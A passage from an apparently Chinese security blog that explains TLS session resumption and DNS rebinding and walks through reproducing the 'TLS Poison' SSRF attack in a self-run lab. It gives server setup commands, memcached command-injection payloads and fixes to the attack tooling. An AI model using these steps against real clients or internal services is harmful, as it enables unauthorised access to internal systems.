消息进行响应，这个扩展包含了它要用于密钥交换的加密方法，并且服务器将其参数一同发送给客户端。 服务器和客户端都交换认证消息。 服务器向客户端发送 NewSessionTicket 消息，其中包含一个 PSK ，客户端可以通过在 ClientHello 消息的 pre_shared_key 扩展中包含这个 PSK ，用于未来的握手。 客户端和服务器现在可以交换加密的应用数据。 在未来的握手中，客户端向服务器发送一个包含 key_share 和 pre_shared_key 扩展名的 ClientHello 消息。 pre_shared_key 扩展包含 NewTicketSession 消息中发送的 PSK 。 服务器用包含 pre_shared_key 和 key_share 扩展名的 ServerHello 消息作出响应。 pre_shared_key 扩展包含服务器同意使用的 PSK ，并将其参数发送给客户端。 服务器和客户端互相发送 Finished 消息，之后客户端和服务器可以交换加密的应用数据。 我们可以通过一个简单的例子来直观感受一下 TLS 1.3 基于 PSK 的握手过程： 如上图所示，Client 第一次与 Server 握手发送 Client Hello 消息时，只包含了 key_share 拓展，Server 也做出响应的回应，使用包含 key_share 拓展的消息进行回应。 Client 在第二次发送 Client Hello 消息时，带上了之前 Server 在 NewSessionTicket 发送的 pre_shared_key ，将其作为拓展发送至 Server ，随后 Server 响应 Server Hello 消息时，也使用 pre_shared_key 作为拓展响应，这样就完成了基于 PSK 的 Session Resumption 可能有同学会问为什么我们看不到类似 TLS 1.2 当中直接有一个 NewSessionTicket 呢？我们可以仔细回顾一下上面的 RFC 流程图，Server 返回的 NewSessionTicket 消息有个中括号，而这里的中括号表示的是使用从 [sender]_application_traffic_secret_N 导出的密钥保护的信息，所以我们使用 wireshark 无法直接看到其中的内容，但是其中我们使用 opnssl 时候能够更明显的看到 Server 发过来的 TLS Session Ticket ，如图所示，也就是我们 Client 在进行恢复会话时所携带的 PSK ，在使用 openssl 进行恢复会话时，就会提示我们已经恢复了会话。这样就完成了一次 Session Resumption TLS 1.3 Session Resumption - 0-RTT虽然 TLS 1.3 最大的亮点之一是 0-RTT ，但是我们这里不做详细的分析，因为我们可以从下面的 RFC 8446 提供的流程图看出来，虽然增加了一个 early_data ，但是对于本篇文章来说并不是重点，他依然使用了 pre_shared_key ，所以对于上文基于 PSK 的会话恢复模式来说基本一致，这里就不做过多分析，感兴趣的同学可以自行搜索了解。 1234567891011121314151617181920212223242526272829303132333435Client ServerClientHello+ early_data+ key_share*+ psk_key_exchange_modes+ pre_shared_key(Application Data*) --------&gt; ServerHello + pre_shared_key + key_share* {EncryptedExtensions} + early_data* {Finished} &lt;-------- [Application Data*](EndOfEarlyData){Finished} --------&gt;[Application Data] &lt;-------&gt; [Application Data] + Indicates noteworthy extensions sent in the previously noted message. * Indicates optional or situation-dependent messages/extensions that are not always sent. () Indicates messages protected using keys derived from a client_early_traffic_secret. {} Indicates messages protected using keys derived from a [sender]_handshake_traffic_secret. [] Indicates messages protected using keys derived from [sender]_application_traffic_secret_N. Figure 4: Message Flow for a 0-RTT Handshake SSRF服务器端请求伪造 (Server-Side Request Forgery, SSRF) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 DNS RebindingDNS重新绑定是计算机攻击的一种形式。 在这种攻击中，恶意网页会导致访问者运行客户端脚本，攻击网络上其他地方的计算机。攻击者注册一个域名（如attacker.com），并在攻击者控制下将其代理给DNS服务器。 服务器配置为很短响应时间的TTL记录，防止响应被缓存。 当受害者浏览到恶意域时，攻击者的DNS 服务器首先用托管恶意客户端代码的服务器的 IP 地址作出响应。 例如，他们可以将受害者的浏览器指向包含旨在在受害者计算机上执行的恶意 JavaScript 或 Flash 脚本的网站。 恶意客户端代码会对原始域名（例如attacker.com）进行额外访问，这些都是由同源政策所允许的。 但是，当受害者的浏览器运行该脚本时，它会为该域创建一个新的 DNS 请求，并且攻击者会使用新的 IP 地址进行回复。 例如，他们可以使用内部 IP 地址或互联网上某个目标的IP地址进行回复。 TLS Poison好了，终于介绍完背景知识了，现在让我们来看看本次要介绍的 TLS Poison 攻击。 这里一句话帮大家总结概括一下：我们可以利用 TLS Session Resumption 的特性结合 DNS Rebinding 技巧操作一些客户端帮助我们进行 SSRF 攻击。 其实整个攻击就像上述说的一样，非常通俗易懂，无非就是 TLS Session Resumption 、 DNS Rebinding 、一个傻白甜受害者，结合在一起就便有了我们的 TLS Poison 。 PS: 如无特殊说明，整个实验背景均基于 Ubuntu 20.04 LTS ，curl 7.68.0 build with OpenSSL/1.1.1f ，后文提到的 IPv6 均指的是 IPv4-mapped IPv6 addresses 这类地址 Attack Steps让我们进一步来看看这个攻击思路： 首先我们可以从背景知识当中知道 TLS Session Resumption 特性，无论是 TLS 1.2 或者 1.3 ，它们都会使用了一个凭据一样的东西来表明客户端的身份，就像在 Web 浏览中的 Cookie 一样，这个凭据又是由服务端下发给客户端的，所以如果我们有一个恶意的 Server ，让一个客户端使用 HTTPS 访问我们的服务器时，在 TLS 握手时这个凭据就是我们恶意服务器分配给客户端的，而客户端会把这个凭据按照一定规则存储起来，以便以后需要跟我们恶意服务器恢复上一次会话时使用。所以，从这里我们可以知道，如果可以让客户端以 HTTPS 形式访问任意服务器，在进行 TLS 握手时我们可以让客户端存储我们指定的会话凭据。 接着，在进行 HTTPS 请求前，客户端必定需要对我们给的域名进行一次 DNS 查询，而在客户端想要恢复会话的时候，如果客户端的 DNS 缓存过期，则又会进行一次 DNS 查询；如果没有过期，则利用之前的 DNS 查询结果得到的 IP 进行恢复会话。所以当条件满足，也就是正好在客户端想要恢复 TLS 会话，而 DNS 缓存又过期了的时候，就会发起一次 DNS 查询，这里正好就满足了 DNS Rebinding 的条件。 这样我们就可以为自己的域名搭建一个 DNS 服务器，在客户端第一次发起 DNS 请求时，我们让 DNS 服务器返回正确的、指向我们恶意服务器的 IP ，让第一次 TLS 握手成功，也让客户端缓存我们制定的会话凭据；在客户端恢复会话时，也就是客户端发起第二次 DNS 请求时，我们让 DNS 服务器返回我们想要攻击的内网地址，例如 127.0.0.1 ，这样在客户端尝试恢复会话的时候，客户端会拿着我们给它的特制票据去与这个地址尝试进行 TLS 握手。 这意味着什么呢？特制的票据、指定的内网地址，就构成了一次对内网服务的请求！ 但是似乎我们又忽略了什么？如果我想攻击内网的 Memcached ，端口在 11211 不在 443 怎么办？正如我们上面所强调的“客户端会把这个凭据按照一定规则存储起来”，那么这个一定规则又是什么呢？ 我们可以随便找个例子来看，比如 curl 7.75.0 ，在 curl 源码的 lib/vtls/vtls.c#408 文件当中，我们可以找到这样的代码： 12345678910111213141516171819202122232425for(i = 0; i &lt; data-&gt;set.general_ssl.max_ssl_sessions; i++) { check = &amp;data-&gt;state.session[i]; if(!check-&gt;sessionid) /* not session ID means blank entry */ continue; if(strcasecompare(name, check-&gt;name) &amp;&amp; ((!conn-&gt;bits.conn_to_host &amp;&amp; !check-&gt;conn_to_host) || (conn-&gt;bits.conn_to_host &amp;&amp; check-&gt;conn_to_host &amp;&amp; strcasecompare(conn-&gt;conn_to_host.name, check-&gt;conn_to_host))) &amp;&amp; ((!conn-&gt;bits.conn_to_port &amp;&amp; check-&gt;conn_to_port == -1) || (conn-&gt;bits.conn_to_port &amp;&amp; check-&gt;conn_to_port != -1 &amp;&amp; conn-&gt;conn_to_port == check-&gt;conn_to_port)) &amp;&amp; (port == check-&gt;remote_port) &amp;&amp; strcasecompare(conn-&gt;handler-&gt;scheme, check-&gt;scheme) &amp;&amp; Curl_ssl_config_matches(ssl_config, &amp;check-&gt;ssl_config)) { /* yes, we have a session ID! */ (*general_age)++; /* increase general age */ check-&gt;age = *general_age; /* set this as used in this age */ *ssl_sessionid = check-&gt;sessionid; if(idsize) *idsize = check-&gt;idsize; no_match = FALSE; break; }} 上述代码就是通过对于端口、协议、域名的比较来决定是否使用 sessionid ，而check变量的结构体就是Curl_ssl_session，在 lib/urldata.h#295 当中，我们还可以看到对于Curl_ssl_session结构体的定义 123456789101112/* information stored about one single SSL session */struct Curl_ssl_session { char *name; /* host name for which this ID was used */ char *conn_to_host; /* host name for the connection (may be NULL) */ const char *scheme; /* protocol scheme used */ void *sessionid; /* as returned from the SSL layer */ size_t idsize; /* if known, otherwise 0 */ long age; /* just a number, the higher the more recent */ int remote_port; /* remote port */ int conn_to_port; /* remote port for the connection (may be -1) */ struct ssl_primary_config ssl_config; /* setup for this session */}; 所以对于 curl 7.75.0 来说，这个规则就是端口相同、域名相同、协议相同， curl 就会尝试去使用 sessionid 进行访问。 所以整个攻击思路我们大体上就明白了，让我们再来看看作者当初提出的攻击流程，直观感受一下这个攻击（这里我们用 HTTPS 举例）： 首先第一步攻击者发送一个 https://jmaddux.com:25 的地址给一个 Client ，Client 会首先进行 DNS 查询询问 jmaddux.com 的 IP 地址，此时攻击者自己控制的 DNS Server 可以自定义响应为一个正常的 IP ，比如 35.x.x.x ，此时我们可以给这个响应记录非常短非常短的 TTL ，以便让 Client 不要缓存我们的 DNS 记录。 第二步， Client 会与攻击者指定的 35.x.x.x 这个攻击者的服务器进行 TLS 握手，并获得攻击者服务器返回给 Client 的特制的票据，在图中表示为 Payload ，然后完成 TLS 握手。 第三部，当 Client 想与 Server 恢复会话时，需要再次查找 jmaddux.com 的 DNS 记录，由于攻击者之前给的 DNS 记录 TTL 时间非常非常短，让其在此时在自己的缓存中查不到原来的记录，这样会使得 Client 又去询问 jmaddux.com 的 DNS 记录，此时攻击者让其 DNS Server 返回 127.0.0.1 这个地址。 最后，如果 Client 不校验本次获得的 ip 是否与上次一致，就会尝试与 127.0.0.1:25 进行 TLS Session Resumption ，也就是说， Client 会拿着攻击者特制的票据访问 127.0.0.1:25 ，尝试与之恢复 TLS 会话，这里就表现为 Client 发送含有 Payload 的 Client Hello 消息到 SMTP 服务器，至此完成一次 SSRF 攻击。 整体的流程图如下图所示： 这里再对图中进行一些解释： 攻击者通过一些方式让受害者打开一个 HTML 页面，其中内容会向攻击者准备的 TLS Server https://ssltest.jmaddux.com:11211 发起请求 当受害者打开这个页面后，受害者客户端会查询 ssltest.jmaddux.com 的 DNS 记录，最终会在攻击者准备的 DNS 服务器查询到攻击者提供的解析记录 此时 DNS 服务器正常返回结果为 TLS Server 地址并且 TTL 为 0 的响应 客户端发送 Client Hello 消息 服务端返回 Server Hello 消息，并在响应包中设置 session_id 为 payload 进行后续的TLS握手 握手完成后进行 http 通信时，攻击者 TLS Server 返回 301 跳转到 https://ssltest.jmaddux.com:11211 受害者客户端重新加载 https://ssltest.jmaddux.com:11211 理论上由于之前 DNS 响应的报文结果中 TTL 为 0 ，受害者客户端会再次向 DNS 服务器询问 ssltest.jmaddux.com 的解析结果 此时攻击者让 DNS 服务器返回解析结果为 127.0.0.1 且 TTL 为 0 接着由于 TLS 会话重用，受害者客户端会使用之前的 session_id 也就是 payload ，带着这个 payload 与 127.0.0.1:11211 进行 TLS 会话重用尝试 payload 被发送至 127.0.0.1:11211 ，达到攻击者目的，但是因为会话重用失败，受害者客户端会得到一个 TLS Error 的错误。至此完成所有攻击步骤。 Setup好了，接下来就让我们自己动手试一试吧！由于我是使用的是两个 VPS ，没有像原作者一样使用 docker ，所以使用 docker 的同学还请自行摸索。并且由于国内复杂的网络环境，为了避免不必要的麻烦，我使用的是两台国外的 VPS 作为学习使用。 我准备的是一个域名、两台 VPS ，其中一台 VPS 作为 DNS 服务器，另外一台作为 TLS 服务器，两台 VPS 均是 ubuntu 20.04 LTS 。作者仓库对于各自 VPS 的准备工作已经介绍得比较全面了，详细可以参阅：https://github.com/jmdx/TLS-poison/#instructions ，这里就不再赘述了。 唯一可能需要说一下的就是证书申请，这部分作者没有提到，为了避免一些同学不清楚的，可以参考一下，知道了的同学就可以跳过了。在 TLS 服务器上的证书准备工作： 按照 https://certbot.eff.org/instructions 安装对应的 cerbot 然后推荐使用 DNS changllenges 的方式弄证书，当然其他方式也可以。certbot --manual --preferred-challenges dns certonly 按照自己的信息填好后，会提示需要到你的 DNS 域名管理商处增加一个 TXT 记录，直接添加上去就好了 然后最后我们在域名的 DNS 上配置一下如下的基本设置，这里以域名为 example.com 举例： Type Name Value A dns (Your DNS VPS IP) NS tls dns.example.com TXT _acme-challenge (这里是 cerbot 验证用的字符串) 然后就先在 DNS VPS 上运行作者的 alternate-dns.py 1sudo python3 alternate-dns.py tls.example.com,127.0.0.1 -b 0.0.0.0 -t Your_TLS_IP -d 8.8.8.8 现在就万事俱备啦！ Let’s Try! Original Method接下来我们在 TLS VPS 进行一下操作，首先由于作者原来是使用的是 docker ，所以有些配置我们需要更改一下： 在 client-hello-poisoning/custom-tls/src/main.rs#642 文件中，需要把redis://redis/更改为自己 TLS 服务器上的 redis 地址，比如默认的是 127.0.0.1:6379 ，这里我们就改成redis://127.0.0.1:6379/ 在原作者的方法中， payload 的设置需要在 redis 当中设置，所以我们可以在 redis 设置好 payload ，如：set payload \"\\r\\nset foo 0 0 12\\r\\ntls session \\r\\n\" 其中 payload 是 redis 当中的 key ，value 是真正发送给 memcached 的内容 Memcached 需要以 CRLF 作为整个命令的结束，并且可以忽略之前的语句错误，而原作者的文档中给出的 payload 是以 \\r 结束，会导致写不进 memcached ，所以我们需要注意一下，我们这里可以使用\"\\r\\nset foo 0 0 13\\ni in ur cache\\r\\n\"作为 payload 。 这里如果要修改的话记得改 set 命令的第三个数字参数，该参数为设置数据的长度，否则也会发生错误写不进 memcahed，比如i in ur cache这里是 13 个字节，前面的第三个数字参数就需要为 13 ；前面的命令与数据间的换行我们可以使用 LF 作为换行，可以节省一个字节长度。 这里建议先使用echo -e \"\\r\\nset foo 0 0 13\\ni in ur cache\\r\\n\"|nc 127.0.0.1 11211来尝试自己的 pyaload 是否能够写入 memcached ，这样如果后面失败了，对后面的排错很有用！至少能排除一个可能存在的问题！ 在原作者的方法中，为了让 TLS 进行 Session Resumption ，作者使用了 HTTP 301 跳转的方式让 TLS 进行恢复会话，而跳转的地址则也需要我们通过 redis 来设置，设置的 key 为 redirect ，以 example.com 举例，我们可以这样进行设置：set redirect \"https://tls.example.com:11211/\" 。（这里是原作者没有在文档中做出说明的地方，得需要阅读 main.rs 代码才能看出来） 还有一点就是作者还提供了一个延迟的选项，以免请求过快（这里有一些其他原因在此处，后续我们会分析到）。我们还是可以通过 redis 来设置 sleep 这个参数，可以达到延迟多少 ms 的效果，如果不设置的话，默认值为 2000 ms ，一般这个数值就可以了。 我们这里以攻击本地的 memcached 为例，在 ubuntu 20.04 LTS 上默认使用apt install memcached安装完成之后，其默认监听在 11211 端口上。之后我们按照作者的说明，在 TLS VPS 上运行 TLSServer ： 1target/debug/custom-tls -p 11211 --verbose --certs /path/to/fullchain.pem --key /path/to/privkey.pem http 好了，现在才终于是一切准备就绪了，我们就可以直接使用 curl 进行测试了。这里为了直观查看 TLS Session Resumption 的效果，我们可以打开两个 wireshark 来观察，一个 wireshark 监听在你对外通信的网络接口上，一个 wireshark 监听在本地回环接口上。运行一下命令访问你的 TLSServer ： 1curl https://tls.example.com:11211/ -Lv PS: 注意这里需要加上-L参数允许 curl 进行重定向。 接着如果第一次 DNS 就把我们的域名解析到 127.0.0.1的话，可以多试几次直到域名解析到你的 TLS VPS IP 上为止，然后等待 1 min 左右，如果网络顺畅，一切顺利的话，在 1min 左右就可以完成本次攻击。攻击效果如下图所示： 其中可能会产生几种结果 第一种最常见的结果就是curl: (47) Maximum (50) redirects followed，表示重定向次数已经超过了 curl 默认的最大深度 50 次，说明 DNS Rebinding 没有将 127.0.0.1 返回到给 Client ，这里因素也比较多，后文会提到，可以说运气比较差，多试几次就行了。 第二种结果是curl: (35) error:1408F10B:SSL routines:ssl3_get_record:wrong version number，如果上面的信息你还看到了Trying 127.0.0.1，那么恭喜你，很有可能这次就成功了，赶紧去 memcached 看看吧 The Details OF Original Method在整理这篇文章之前，我也参考了很多文章，虽然这些文章没有明确的说明这个攻击的攻击载体，也就是 Payload 最大长度是 32 字节，但是都给了让我产生了一种先入为主的概念，在我印象当中它就只局限于 32 字节，然后我去详细去看作者公开的 PDF 时，发现作者在演示攻击 SMTP 时有一个图是这样的： 其中我们可以看到这个 payload 已经远远超过了 32 字节，然后我抱着疑惑去反复查看作者公布的演讲录像，其中他有这么说到（但愿我的英语听力以及 Youtube 字幕足够准确）： ​ It might seem too good to be ture but TLS actually provides us exactly that in the form of a session id. Most clients even persist this field for later use. Session ids are limited to 32 bytes as you can see but depending on the implementation you might have session ticket. This one is about 200 bytes but these can be up to around 65 kilobytes. But session ids and session tickets are mechanisms for a TLS client to go. Remember that cryptographic key exchange we did earlier let’s just keep using that key in this new connection. TLS 1.3 includes a slightly more complicated but similar mechanism called a pre-shared key identity which pretty much does the smae thing for our purposes. All of these are about optimization since key exchange can be time consuming. But they provide a certain way for a server to tell whatever is connecting to it to persist some data for lighter use, almost like a cookie that lives in plain text. So it’s perfect for the surf attack we’re trying to do. 也就是说这个攻击本来就可以做到超过 32 字节的做法，也就是我们之前所说的那几种 Session Resumption ，只有 SessionID 局限于 32 字节以下。 并且按照上面我们的实验结果其中我们可以看到，按照原来作者在其仓库 README 描述的方法，我们可以从实践中看出如下几个点： 双方默认使用 TLS 1.3 进行握手数据交互，当然这里需要你的 curl 支持 TLS 1.3 TLS 1.3 使用 PSK 进行 Session Resumption PSK 后面还包含了很多个 0x00 ，总长度远远超过了 32 字节 所以作者原仓库实现的是基于 TLS 1.3 的 Session Resumption ，后面我们具体看其实现代码发现也确是如此，作者只实现了基于 PSK 的会话恢复 SSRF ，其他几类都没有实现。 所以，感觉一切都有些明朗了，那我们再来尝试一下超越 32 字节的 payload ，看看到底能不能实现。依旧按照如上的流程做好 setup ，只不过不同的是我们需要在 TLS VPS 的 redis 上修改一下 payload ，这次我们随意修改一下，只要够长就好，这里一定要注意把要发给 memcached 的 payload 当中的set指令的第三个参数修改成其 value 的长度，比如说我们这里修改 payload 为：set payload \"\\r\\nset foo 0 0 79\\nThis time I'm really in your cache and I can write what I want into your cache.\\r\\n\"。（当然还是建议在实验之前使用之前的方法测试一下自己的 payload 能否写入到 memcached 当中） Ok. Here we go. 当当，我们已经可以写入超过 32 字节的数据啦！ The Bad Code IN Original Method经过上述两个实验，我已经猜到可能大多数同学的实验并不是一次都成功，很多人可能都是得到第一种结果，也就是超过了 curl 最多重定向次数而失败，而导致这个结果的原因一般来说就是 DNS Rebinding 失败，没有在第二次 DNS 查询的时候返回 127.0.0.1 ，这样一直在与 TLSServer 进行通信导致最后重定向次数过多而失败。 让我们简单看看作者的 DNS Rebinding 怎么写的，我们重点关注以下代码： 12345678910111213141516171819spoof_count = 0start = time()last_ip = Nonedef get_spoofed_IP(domain, ip): global spoof_count global start global last_ip start = time() last_ip = ip for d in HOSTS_LIST: if re.match(d[0], domain.lower()) or True: spoof_count = (spoof_count + 1) % 3 # The below line will result in the answer switching after 30 seconds, # instead of alternating # return d[1] if (time() - start &gt; 30) else args.TARGET return d[1] if spoof_count == 0 else args.TARGET return None 这是作者自己写的代码，这段代码的意思大概就是通过记录 DNS 查询的总次数，如果查询总次数模 3 为 0 的话，也就是 3 的倍数，返回d[1]，也就是 127.0.0.1 ，否则就返回我们的 TLS VPS IP 。这种方式我们暂且不谈，先不关注。 我们再来看看其注释的方式，也就是我们可以使用注释当中的方式，DNS Server 启动 30s 之前返回 TLS VPS IP ，只需要在 30s 之后， DNS 就会一直返回我们的目标地址 127.0.0.1 。 我们现在先接受一个结论，就是 curl 对于一个域名有一定的 DNS 缓存时间，那么如果我们想让 curl 第一次 DNS 查询得到 TLS VPS IP ，在缓存时间结束之后查询的结果返回 127.0.0.1 ，那么注释当中的方式是最好不过的了。 好了，接下来就是公开处刑（我也不知道作者是不是粗心大意写出这样的代码）： 123456789101112131415161718spoof_count = 0start = time()last_ip = Nonedef get_spoofed_IP(domain, ip): global spoof_count global start global last_ip start = time() last_ip = ip for d in HOSTS_LIST: if re.match(d[0], domain.lower()) or True: spoof_count = (spoof_count + 1) % 3 # The below line will result in the answer switching after 30 seconds, # instead of alternating return d[1] if (time() - start &gt; 30) else args.TARGET return None 让我们再来回顾这段代码：嗯，写的非常的棒，用time()计时，超过 30s 就返回目标 IP ，太对了哥。如果还没看出来的同学，我再简化一下： 12345678910111213spoof_count = 0start = time()last_ip = Nonedef get_spoofed_IP(domain, ip): global spoof_count global start global last_ip start = time() if time() - start &gt; 30: return d[1] else: return args.TARGET 我觉得只要你的机器稍微正常一点，正常执行几行赋值语句的 python 代码的速度应该不会超过 30s 吧？这个在使用time()函数对start变量赋值之后，又使用了time()函数获取时间戳与start变量相减。啊这，反正我的机器是减不出 30s ，这段代码就让我感觉到作者写的非常的离谱…当然这里纯属个人吐槽，这里我们只需要把函数内对于start变量再次赋值的操作删除就行了，这样start得到的时间就是程序启动的时间了。（除非我哪里误解了这段代码） 当然我建议时间间隔在 10s 这样就行，这样就能比较精准的让 curl 在第二次 DNS 查询的时候拿到 127.0.0.1 的响应了。（一只黄色的哆啦A梦：这人也太菜了.jpg 当然，或者你也可以使用总次数的方式，如果总次数超过一次立即返回 127.0.0.1 也是可以的，不过万一被别人查了第一次就尴尬了，但是一般来说不会。 The Optimization Method OF DNS Rebinding就像我们上文所提到的，这个攻击主要取决于两个点，一个是 TLS Session Resumption ，另一个就是 DNS Rebinding 。一个好的 DNS Rebinding 可以起到事半功倍的效果。 我询问了一些 CTFer ，也查证了一些 DNS Rebinding 的工具，诸如 rbndr / ceye 等比较常用的工具，一般统一做法都是每次返回一个 TTL 较小的 A 记录，只不过每次返回的记录不同，大部分都是在用户指定的 A 记录当中随机概率返回一个。这样如果使用这些 DNS Rebinding 工具在这里就不是一个非常好的选择。 随后，@zhaojin 在 基于 A 和 AAAA 记录的一种新 DNS Rebinding 姿势–从西湖论剑2020 Web HelloDiscuzQ 题对 Blackhat 上的议题做升华 提到新的方法，似乎可以使用一个域名同时分配一个 A 记录跟一个 AAAA 记录，因为 curl 会优先使用 AAAA 记录，而当 AAAA 记录的 IPv6 无法建立连接时，会尝试跟 A 记录的 IPv4 进行建立连接。我觉得是个很有趣的想法，整个思路大致如下： 第一次让 curl 去访问恶意的 HTTPS 服务器，拿到一个恶意的 SessionID 然后使恶意的 HTTPS 服务器无法接收新的连接 这时恶意的 HTTPS 给出第一次返回的结果，使其进行同域名跳转 跳转时会尝试进行新连接，发现恶意的 HTTPS 服务器无法连接。 则会尝试连接这个域名下的其他记录所指向的地址，并带上 SessionID ​ 在 CURL 中，对于一个域名，如果同时具有 A 记录和 AAAA 记录，那么 CURL 会去优先请求 AAAA 或者 A 记录所指向的地址，如果这些地址无法连接，则会尝试连接同时得到的 A 记录或者 AAAA 记录。 在某些情况下，会出现： AAAA 记录地址不通，会连接到 A 记录地址上。 A记录地址不通，会连接到 AAAA 记录地址上。 但是比较遗憾的是，如果对于一个域名进行这样的设置，AAAA 记录指向 TLS VPS 的 IPv6 地址上，A 记录指向 127.0.0.1 地址，实际测试 当中， curl 总是优先 127.0.0.1 ，并且没有随机的做法；如果对于一个域名进行这样的设置，AAAA 记录指向 ::1 地址上，A 记录指向 TLS VPS 的 IPv4 地址上，curl 总是优先 ::1 2021/05/14 更新： 感谢 @chuye 指出此处错误，原文已更正。 之前的错误： 如果对于一个域名进行这样的设置，AAAA 记录指向 ::ffff:127.0.0.1 或者 ::1 地址上，A 记录指向 TLS VPS 的 IPv4 地址上，虽然似乎可以做到 curl 因优先 AAAA 记录与 TLS VPS 建立连接获得恶意 Session ID ，但是实际测试默认 memcached 配置，无法通过这两个(::ffff:127.0.0.1 或者 ::1)地址进行写入 memcached 。 更正：curl 以 ::1 优先，而且原来的语序产生了错误。以及 Memcached 实际上是接受从 ::ffff:127.0.0.1 或者 ::1 写入的，详见 Additional Remarks 虽然有些遗憾无法复现 @zhaojin 所说的这个方法，但是我觉得是个很有趣的想法，以及 @Ivan Komarov 提到 DNS 对于一个域名可以返回双 A 记录，也能有类似的效果，所以我们可以这样进行尝试： 首先，默认配置下， 我们也可以通过 0.0.0.0:11211 这个地址与 memcached 通信 对于返回的双 A 记录，一个配置为 TLS VPS IP ，另一个为 0.0.0.0 ，curl 每次都会优先使用 TLS VPS IP ，如果不能通信才会接着使用 0.0.0.0:11211 那根据已知信息，那么与上文的做法类似，我们是不是也可以让 curl 第一次建立链接，拿到我们分配的 payload 后，断开连接，让其第二次连接不通而去选择另外一个 IP 呢？ 事实说明，我们也确实可以这么做。基于 @Ivan Komarov 提供的 DNS Server 以及 @zhaojin 使用的 proxy.py ，我们可以拉取我整理的仓库 https://github.com/ZeddYu/TLS-poison 进行实验。 这里 DNS VPS 的 setup 我们需要使用 client-hello-poisoning/new-custom-dns/alternate-dns.py 进行我们域名的解析： 1python3 alternate-dns.py tls.example.com --ip x.x.x.x --mode static_zero x.x.x.x 为你 TLS Server IP ，mode 有两种，rebinding模式则为普通的重绑定解析模式，static_zero则是我们这次测试的双 A 记录。 TLS VPS 的 setup 还是与之前一样，只不过这次我们需要把 TLS Server 的端口绑定在 11210 上，使用 proxy.py 将 11211 的流量转发到 TLS Server 上，而且该转发只转发一次，所以可以造成 curl 第二次连接失败，也就能让其切换到另一个 IP 进行连接了。 1target/debug/custom-tls -p 11210 --verbose --certs /root/tls/fullchain.pem --key /root/tls/privkey.pem http Ok. Let’s have a try. 可以看到这里 curl 不需要再经过多次重定向，只需要一次重定向就可以稳定进行 SSRF ，也不再需要依靠 DNS Rebinding 的稳定性了。 Use The Optimization Method To Deal With TLS 1.2 Session Ticket尽管我们可以使用 TLS 1.3 PSK 进行 Session Resumption ，但是根据 https://caniuse.com/?search=tls%201.3 的数据显示，目前 TLS 1.3 全球覆盖率为 91.12% ，而 TLS 1.2 的覆盖率为 98.4% ，并且目前淘宝、百度等知名主站均还没有完全支持 TLS 1.3 ，所以有些时候还是需要我们使用TLS 1.2 ，而作者又偷了一点懒，没有实现任何 TLS 1.2 相关的利用方式，而 @zhaojin 使用的 tlslite-ng 目前还并未支持 TLS 1.2 当中的 Session Ticket ，而又正好作者修改的 rustls 实现的功能比较完善，所以我只能硬头皮刚了一波 rust ，为原作者的 TLSServer 增加了基于 TLS 1.2 Session Ticket 的修改功能。 依旧使用我修改的仓库 https://github.com/ZeddYu/TLS-poison ，对于 DNS Server setup 还是使用优化的双 A 记录的方法，但是对于 TLS Server setup 我们需要改变一下： 1target/debug/custom-tls -p 11210 --verbose --certs /root/tls/fullchain.pem --key /root/tls/privkey.pem --tickets --protover 1.2 http 使用参数--tickets，允许 TLS Server 使用 Session Tickets 进行 Session Resumption ；使用--protover 1.2参数，只允许 TLS Server 最高使用 TLS 1.2 版本。并在 redis 设置 ticket_payload ，这个与之前设置的 payload 值一样，是用来对 memcached 进行利用的，我们这里就区别于之前随便设置一下就可以了，例如set ticket_payload \"\\r\\nset foo 0 0 41\\nThis is a TLS 1.2 session ticket example.\\r\\n\" 对于 Client ，我们不能再使用 curl ，因为其并没有实现 Ticket Session 插件…所以我选用了老版本 Chrome 70.0.3538.77 for Ubuntu 进行学习。（提醒这里不要用 Firefox ，因为作者在 PDF 中表示过 Firefox 没有这个“特性”） 依旧在 TLS Server 上使用 proxy.py ，接着确定准备好就可以在本地打开 chrome 访问自己 TLS Server 的地址： 因为 Chrome 的一个特殊机制，使用 Chrome 测试我们并不能像 curl 那样一次就能成功，这里我们最好使把 Chrome 的 Keep local data only until you quit your browser 选项打开以及设置每次打开 Chrome 时就打开我们的 TLS Server 地址，这样实验就比较方便了，多试几次我们就可以看到上图这个效果。 Use The Optimization Method To Deal With TLS 1.2 Session ID那要是遇到只能用 curl/libcurl ，而且 TLS 1.3 又不支持的情况，那就只能通过 TLS 1.2 Session ID 来实现我们注入 payload 实现 SSRF 了，我们能做的就是使用双 A 记录的方法来提高攻击稳定性。 由于作者写的不是很好，并没有对 TLS 1.2 进行适配，而我也并不熟悉 rust ，只能勉强找到作者代码库的问题，大概就是由于作者在 main.rs#730 循环中每次都使用了新的 config ，如下代码所示： 123456789101112131415161718loop { poll.poll(&amp;mut events, None) .unwrap(); config = make_config(&amp;args, session_id_generator.clone()); tlsserv.tls_config = config; for event in events.iter() { match event.token() { LISTENER =&gt; { if !tlsserv.accept(&amp;mut poll) { break; } } _ =&gt; tlsserv.conn_event(&amp;mut poll, &amp;event) } }} 导致了在 rustls/src/server/hs.rs#718 中每次根据client_hello.session_id.get_encoding()都取不到存储的 Session ID 1234567891011121314// Perhaps resume? If we received a ticket, the sessionid// does not correspond to a real session.if !client_hello.session_id.is_empty() &amp;&amp; !ticket_received { let maybe_resume = sess.config.session_storage .get(&amp;client_hello.session_id.get_encoding()) .and_then(|x| persist::ServerSessionValue::read_bytes(&amp;x)); if can_resume(sess, &amp;self.handshake, &amp;maybe_resume) { return self.start_resumption(sess, client_hello, sni.as_ref(), &amp;client_hello.session_id, maybe_resume.unwrap()); }} 所以我们只需要把 main.rs#734 以下两行进行注释即可： 12// config = make_config(&amp;args, session_id_generator.clone());// tlsserv.tls_config = config; 虽然可以 debug 找到问题所在，但是并不能完美地修正这个问题，只能做个临时的处理办法来解决这个问题，而且自己时间精力并不太足够，所以如果有同学有比较好的办法解决这个问题欢迎提 PR 修正这个问题！ 然后在 redis 中修改 payload 为 32 字节长度：set payload \"\\r\\nset foo 0 0 13\\nI am so poor.\\r\\n\"。好了，那就让我们来试一下吧！ 虽然我们只能使用 32 字节的 Session ID ，但是对于 memcahed ，我们可以使用append命令进行追加，例如：set payload \"\\nappend foo 0 0 11\\nSo so poor.\\r\\n\"。并且因为我们注释了那两行，所以对于重新设置了的 payload ，我们需要重新启动一次 TLS Server 好了，以上就是我们关于 TLS Poison 漏洞复现的部分。 Attack 